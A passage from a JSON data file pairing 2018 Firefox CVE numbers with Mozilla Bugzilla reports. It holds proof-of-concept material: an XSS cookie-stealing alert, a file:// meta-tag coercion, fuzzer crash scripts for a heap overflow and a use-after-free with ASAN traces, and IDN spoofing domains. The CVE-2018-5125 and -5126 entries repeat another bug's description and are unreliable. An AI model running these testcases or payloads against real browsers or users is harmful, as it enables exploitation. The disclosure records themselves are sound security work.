cookie (overwriting the existing one with additional HttpOnly flag): HTTP/1.1 200 OK Content-Type: text/html Content-Length: 303 Connection: close Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: PHPSESSID=qevb2lkbjviniu2i3ie278tp45; path=/; httponly Vary: Accept-Encoding <...> Summary: ========= \"Upgrading/Overwriting\" a normal cookie to a httponly flagged cookie. Actual results: The cookie is, although now flagged with httponly, still accessible via JavaScript: PoC 1: Web Console: document.cookie \"PHPSESSID=qevb2lkbjviniu2i3ie278tp45\" PoC 2: also works via Cross-Site Scripting vector, aka: <script>alert(document.cookie)</script> -> resulting in an alert box disclosing the cookie value Expected results: After setting the httpOnly flag, the cookie should be protected from accessing it via JavaScript. This is a Cross-Site Scripting prevention meassure which seems to not work as intended anymore (worked as intended in earlier versions of Firefox, and works as intended in other Browsers (Chrome))."
      }
    ],
    "CVE-2018-5115": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1409449",
        "title": "Phishing vector via http auth of background connections",
        "description": "+++ This bug was initially created as a clone of Bug #1408138 +++ In bug 1408183 comment 4 through bug 1408183 comment 11 Jerry describes a related but different problem. Nothing to do with 'Mixed Content', but the fact that background connections (in that example something to do with the OpenH264 plugin handling media server requests) can pop HTTP Auth. They have to go somewhere so we stick them in the currently active page. They don't get the \"WARNING this isn't the top-level site\" text we give for sub-resource auth because it's disconnected from the page. Problem compounded in that case because they were http: requests and could be hijacked locally to trigger auth. The real solution would be to ignore HTTP Auth on background requests not associated with a page."
      }
    ],
    "CVE-2018-5118": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1420049",
        "title": "Activity Stream screenshots can be coerced to (attempt to) load File:// URIs",
        "description": "In 1393924 we introduced functionality to pull images references from meta tags, so that we show better screenshots on the newtab page. I'm not sure if the screenshot code is new or existing, but as a consequence, web pages can the content process to attempt a load of a local file. Luckily the sandbox stops the load, but it seems bad that the load is even attempted. STR: Create a page with a tag like: <meta name=\"twitter:image\" content=\"file:///Users/paul/Pictures/dog.jpg\"> Expected results: nothing loads Actual results: Error message observable in system console: getScreenshot error: Error: page-thumbnail:error After turning on sandbox logging (set security.sandbox.logging.enabled to true), I noticed the content process failing to access a file, using OSX console: \"SandboxViolation: plugin-container(39465) deny file-read-metadata /Users/paul/Pictures/dog.jpg\" The code in ContentMetaHandler[1] doesnt seem to do any validation of the data pulled out of the content page. That sounds dangerous to me, but Im not sure if the expectation is that sanitzation/validation happens later. [1] https://searchfox.org/mozilla-central/source/browser/modules/ContentMetaHandler.jsm#74 == Impact== Allowing web pages to coerce chrome privileged requests (I assume this is chrome privileged since the file load occurs) is dangerous. I don't _think_ there is any way to exploit this directly since a) the content doesnt come back to the web and b) sandboxing adds a layer of defense. But not fixing this seems like it would be asking for future trouble if this bug could be chained with something else."
      }
    ],
    "CVE-2018-5119": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1420507",
        "title": "Reader view ignores crossorigin attribute",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: 1. Go to https://test.shhnjk.com/vidcors.html. 2. Observe an alert saying \"Blocked by CORS\". 3. Click on open in reader view button. Actual results: Cross-origin video loaded (crossorigin attribute ignored). Expected results: Crossorigin attribute in reader view should be respected as normal page."
      }
    ],
    "CVE-2018-5121": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1402368",
        "title": "URL spoofing with using U+0F37 and U+0F35 Tibetan",
        "description": "http://xn--google-usv.com/ (U+0F37 after 'e'). http://xn--google-gsv.com/ (U+0F35 after 'e')."
      }
    ],
    "CVE-2018-5122": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1413841",
        "title": "WebCryptoTask integer overflow",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36 Steps to reproduce: AesTask:: DoCrypt() in dom/crypto/WebCryptoTask.cpp potential integer overflow. if dataLen is bigger than or equal to 0xfffffff0, maxLen would overflow, so mResult's length would be a small integer. then calling PK11_Encrypt or PK11_Decrypt could cause writing beyond mResult's buffer uint32_t dataLen = mData.Length(); uint32_t maxLen = dataLen + 16; if (!mResult.SetLength(maxLen, fallible)) { return NS_ERROR_DOM_UNKNOWN_ERR; } uint32_t outLen = 0; // Perform the encryption/decryption if (mEncrypt) { rv = MapSECStatus(PK11_Encrypt(symKey.get(), mMechanism, &param, mResult.Elements(), &outLen, mResult.Length(), mData.Elements(), mData.Length())); } else { rv = MapSECStatus(PK11_Decrypt(symKey.get(), mMechanism, &param, mResult.Elements(), &outLen, mResult.Length(), mData.Elements(), mData.Length())); }"
      }
    ],
    "CVE-2018-5123": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=CVE-2018-5123",
        "title": "Prevent cross-site image requests from leaking contents of certain fields due to regex search",
        "description": "Via the image generation in report.cgi it is possible for a third-party website to extract confidential bug information if a logged-in user with access to a confidential bug visits the website. For example, a third-party website can access the summary of a security-sensitive bug report. The problem exists because via report.cgi complex queries to the bugzilla database can be done and if there is a result, an image will be returned, but if the query has no result no image is returned. Because of this a third-party website can extract information by detecting if certain images can be loaded or not. POC: 1.) download attached poc.html 2.) login to bugzilla 3.) open poc.html and enter a bug id of a confidential bug and the url of the bugzilla installation (I have tested the poc with URL: https://bugzilla.mozilla.org and Bug ID: 1395143) 4.) click on “Get Summary” After a while, most of the summary is displayed at the html file."
      }
    ],
    "CVE-2018-5125": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1416529%2C1434580%2C1434384%2C1437450%2C1437507%2C1426988%2C1438425%2C1324042%2C1437087%2C1443865%2C1425520",
        "description": "Via the image generation in report.cgi it is possible for a third-party website to extract confidential bug information if a logged-in user with access to a confidential bug visits the website. For example, a third-party website can access the summary of a security-sensitive bug report. The problem exists because via report.cgi complex queries to the bugzilla database can be done and if there is a result, an image will be returned, but if the query has no result no image is returned. Because of this a third-party website can extract information by detecting if certain images can be loaded or not. POC: 1.) download attached poc.html 2.) login to bugzilla 3.) open poc.html and enter a bug id of a confidential bug and the url of the bugzilla installation (I have tested the poc with URL: https://bugzilla.mozilla.org and Bug ID: 1395143) 4.) click on “Get Summary” After a while, most of the summary is displayed at the html file."
      }
    ],
    "CVE-2018-5126": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1433671%2C1414768%2C1416523%2C1425691%2C1441006%2C1429768%2C1426002%2C1297740%2C1435566%2C1432855%2C1442318%2C1421963%2C1422631%2C1426603%2C1404297%2C1425257%2C1373934%2C1423173%2C1416940",
        "description": "Via the image generation in report.cgi it is possible for a third-party website to extract confidential bug information if a logged-in user with access to a confidential bug visits the website. For example, a third-party website can access the summary of a security-sensitive bug report. The problem exists because via report.cgi complex queries to the bugzilla database can be done and if there is a result, an image will be returned, but if the query has no result no image is returned. Because of this a third-party website can extract information by detecting if certain images can be loaded or not. POC: 1.) download attached poc.html 2.) login to bugzilla 3.) open poc.html and enter a bug id of a confidential bug and the url of the bugzilla installation (I have tested the poc with URL: https://bugzilla.mozilla.org and Bug ID: 1395143) 4.) click on “Get Summary” After a while, most of the summary is displayed at the html file."
      }
    ],
    "CVE-2018-5127": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1430557",
        "title": "heap-buffer-overflow in DOMSVGPathSegCurvetoCubicAbs",
        "description": "The following testcase crashes the latest ASAN build of Firefox 59.0a1 (SourceStamp=21ddfb9e6cc008e47da89db50e22697dc7b38635). <script> o1035=document.createElementNS('http://www.w3.org/2000/svg','path'); o1035.setAttribute('d','M 19 786434 C 7077888 11, 18 98304, 10 94208 z'); o1161=o1035.animatedPathSegList; o1189=o1035.createSVGPathSegLinetoVerticalRel(1); o1398=o1161.getItem(1); o1768=o1035.pathSegList; o1768.replaceItem(o1189,1); o1768.insertItemBefore(o1189,1); o1768.appendItem(o1398); </script> ASAN output: ================================================================= ==29577==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x606000283af4 at pc 0x0000004bdf99 bp 0x7ffd6aace280 sp 0x7ffd6aacda30 READ of size 24 at 0x606000283af4 thread T0 (file:// Content) #0 0x4bdf98 in __asan_memcpy /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3 #1 0x7fa50b44eb55 in DOMSVGPathSegCurvetoCubicAbs /builds/worker/workspace/build/src/dom/svg/DOMSVGPathSeg.h:363:3 #2 0x7fa50b44eb55 in mozilla::DOMSVGPathSegCurvetoCubicAbs::Clone() /builds/worker/workspace/build/src/dom/svg/DOMSVGPathSeg.h:363 #3 0x7fa50b42d4de in mozilla::DOMSVGPathSegList::InsertItemBefore(mozilla::DOMSVGPathSeg&, unsigned int, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/svg/DOMSVGPathSegList.cpp:372:24 #4 0x7fa508e5fc9a in AppendItem /builds/worker/workspace/build/src/dom/svg/DOMSVGPathSegList.h:160:12 #5 0x7fa508e5fc9a in mozilla::dom::SVGPathSegListBinding::appendItem(JSContext*, JS::Handle<JSObject*>, mozilla::DOMSVGPathSegList*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/SVGPathSegListBinding.cpp:348 #6 0x7fa509f594f7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3036:13 #7 0x7fa510992d24 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #8 0x7fa510992d24 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #9 0x7fa51097dd56 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #10 0x7fa51097dd56 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #11 0x7fa510964700 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #12 0x7fa510995cc1 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:706:15 #13 0x7fa51099645f in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:738:12 #14 0x7fa51148f1e6 in ExecuteScript(JSContext*, JS::AutoObjectVector&, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/jsapi.cpp:4712:12 #15 0x7fa508077846 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:266:8 #16 0x7fa50be7caad in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2268:25 #17 0x7fa50be76d39 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1911:10 #18 0x7fa50be740a3 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1555:10 #19 0x7fa50be589fe in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1293:10 #20 0x7fa50be57b19 in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:147:18 #21 0x7fa506e9a84b in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:246:18 #22 0x7fa506e9a84b in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:736 #23 0x7fa506e93ab4 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:540:7 #24 0x7fa506ea013b in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:131:20 #25 0x7fa504dce710 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:395:25 #26 0x7fa504df670d in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #27 0x7fa504e114e0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #28 0x7fa505c9c63a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #29 0x7fa505bf3f29 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #30 0x7fa505bf3f29 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #31 0x7fa505bf3f29 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #32 0x7fa50c0092ea in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #33 0x7fa5106bc1cb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:874:22 #34 0x7fa505bf3f29 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #35 0x7fa505bf3f29 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #36 0x7fa505bf3f29 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #37 0x7fa5106bbbb1 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:700:34 #38 0x4ee915 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #39 0x4ee915 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #40 0x7fa523c1482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #41 0x41dfe8 in _start (/fuzzer3/firefox/firefox+0x41dfe8) 0x606000283af4 is located 0 bytes to the right of 52-byte region [0x606000283ac0,0x606000283af4) allocated by thread T0 (file:// Content) here: #0 0x4bed33 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x7fa504d623c8 in Malloc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:196:46 #2 0x7fa504d623c8 in nsTArrayFallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayFallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayFallibleAllocator>(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:136 #3 0x7fa50938b2c7 in float* nsTArray_Impl<float, nsTArrayFallibleAllocator>::ReplaceElementsAt<float, nsTArrayFallibleAllocator>(unsigned long, unsigned long, float const*, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2025:47 #4 0x7fa50b4c0c43 in Assign<nsTArrayFallibleAllocator, nsTArrayFallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1252:9 #5 0x7fa50b4c0c43 in Assign<nsTArrayFallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1261 #6 0x7fa50b4c0c43 in mozilla::SVGPathData::CopyFrom(mozilla::SVGPathData const&) /builds/worker/workspace/build/src/dom/svg/SVGPathData.cpp:37 #7 0x7fa50b45d9ed in mozilla::SVGAnimatedPathSegList::SetBaseValueString(nsTSubstring<char16_t> const&) /builds/worker/workspace/build/src/dom/svg/SVGAnimatedPathSegList.cpp:57:27 #8 0x7fa50b52b296 in nsSVGElement::ParseAttribute(int, nsAtom*, nsTSubstring<char16_t> const&, nsIPrincipal*, nsAttrValue&) /builds/worker/workspace/build/src/dom/svg/nsSVGElement.cpp:422:20 #9 0x7fa507d3755c in mozilla::dom::Element::SetAttr(int, nsAtom*, nsAtom*, nsTSubstring<char16_t> const&, nsIPrincipal*, bool) /builds/worker/workspace/build/src/dom/base/Element.cpp:2608:8 #10 0x7fa507d36950 in SetAttr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:894:12 #11 0x7fa507d36950 in mozilla::dom::Element::SetAttribute(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsIPrincipal*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/Element.cpp:1348 #12 0x7fa50997ac88 in mozilla::dom::ElementBinding::setAttribute(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:1167:9 #13 0x7fa509f594f7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3036:13 #14 0x7fa510992d24 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #15 0x7fa510992d24 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #16 0x7fa51097dd56 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #17 0x7fa51097dd56 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #18 0x7fa510964700 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #19 0x7fa510995cc1 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:706:15 #20 0x7fa51099645f in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:738:12 #21 0x7fa51148f1e6 in ExecuteScript(JSContext*, JS::AutoObjectVector&, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/jsapi.cpp:4712:12 #22 0x7fa508077846 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:266:8 #23 0x7fa50be7caad in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2268:25 #24 0x7fa50be76d39 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1911:10 #25 0x7fa50be740a3 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1555:10 #26 0x7fa50be589fe in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1293:10 #27 0x7fa50be57b19 in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:147:18 #28 0x7fa506e9a84b in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:246:18 #29 0x7fa506e9a84b in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:736 #30 0x7fa506e93ab4 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:540:7 #31 0x7fa506ea013b in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:131:20 #32 0x7fa504dce710 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:395:25 #33 0x7fa504df670d in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #34 0x7fa504e114e0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #35 0x7fa505c9c63a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #36 0x7fa505bf3f29 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #37 0x7fa505bf3f29 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #38 0x7fa505bf3f29 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 SUMMARY: AddressSanitizer: heap-buffer-overflow /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3 in __asan_memcpy Shadow bytes around the buggy address: 0x0c0c80048700: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c0c80048710: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 0x0c0c80048720: 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd 0x0c0c80048730: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c0c80048740: 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd =>0x0c0c80048750: fd fd fd fd fa fa fa fa 00 00 00 00 00 00[04]fa 0x0c0c80048760: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c0c80048770: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd 0x0c0c80048780: fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 0x0c0c80048790: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa 0x0c0c800487a0: fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==29577==ABORTING"
      }
    ],
    "CVE-2018-5128": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1431336",
        "title": "heap-use-after-free in nsTextEditorState::SetSelectionRange",
        "description": "The following testcase crashes the latest ASAN build of Firefox 59.0a1 (SourceStamp=b7a651281314d6369658eeb58e3bb181cf95016f). It requires the fuzzPriv extension. <script> function start() { o15=document.createElement('input'); o15.setRangeText(undefined+\"\"); document.documentElement.onselect=fun0; document.documentElement.onselectstart=fun1; document.documentElement.appendChild(o15); window.setTimeout(\"tmp()\",100); window.setTimeout(\"location.reload()\", 400); } function tmp() { o15.select(); } function fun0() { o15.setSelectionRange(1,-13); fuzzPriv.trustedKeyEvent(document.documentElement,'press',false,false,true,false,37,0); } function fun1() { o212=o15.cloneNode(false); o212.type='number'; o15.type='hidden'; } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==31055==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c0002788e8 at pc 0x7f83ddca5375 bp 0x7ffc74832330 sp 0x7ffc74832328 READ of size 8 at 0x60c0002788e8 thread T0 (file:// Content) #0 0x7f83ddca5374 in nsTextEditorState::SetSelectionRange(unsigned int, unsigned int, nsITextControlFrame::SelectionDirection, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:1799:10 #1 0x7f83dd0f4e6f in mozilla::dom::HTMLInputElementBinding::setSelectionRange(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLInputElement*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLInputElementBinding.cpp:3511:9 #2 0x7f83dd3aed87 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3036:13 #3 0x7f83e3df6a34 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #4 0x7f83e3df6a34 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #5 0x7f83e3de1a66 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #6 0x7f83e3de1a66 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #7 0x7f83e3dc8410 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #8 0x7f83e3df6f6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #9 0x7f83e3df7a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #10 0x7f83e48dda6c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3029:12 #11 0x7f83dccfe65e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #12 0x7f83dd8a293a in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #13 0x7f83dd8a293a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #14 0x7f83dd869121 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #15 0x7f83dd86b032 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #16 0x7f83dd854a33 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:520:14 #17 0x7f83dd8581b8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:865:9 #18 0x7f83dfc8150f in mozilla::PresShell::DispatchEventToDOM(mozilla::WidgetEvent*, nsEventStatus*, nsPresShellEventCB*) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:7992:7 #19 0x7f83dfc7dbe9 in mozilla::PresShell::HandleEventInternal(mozilla::WidgetEvent*, nsEventStatus*, bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:7786:11 #20 0x7f83dfc7c6f0 in mozilla::PresShell::HandleEventWithTarget(mozilla::WidgetEvent*, nsIFrame*, nsIContent*, nsEventStatus*, bool, nsIContent**) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:7573:17 #21 0x7f83ddc99276 in nsTextInputListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /builds/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:927:22 #22 0x7f83db2626b5 in mozilla::dom::Selection::NotifySelectionListeners() /builds/worker/workspace/build/src/dom/base/Selection.cpp:3840:15 #23 0x7f83dff9cc04 in nsFrameSelection::NotifySelectionListeners(mozilla::SelectionType) /builds/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2022:23 #24 0x7f83db25aba2 in mozilla::dom::Selection::Extend(nsINode&, unsigned int, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/Selection.cpp:3206:25 #25 0x7f83db259a62 in mozilla::dom::Selection::Extend(nsINode*, int) /builds/worker/workspace/build/src/dom/base/Selection.cpp:2921:3 #26 0x7f83dff96021 in 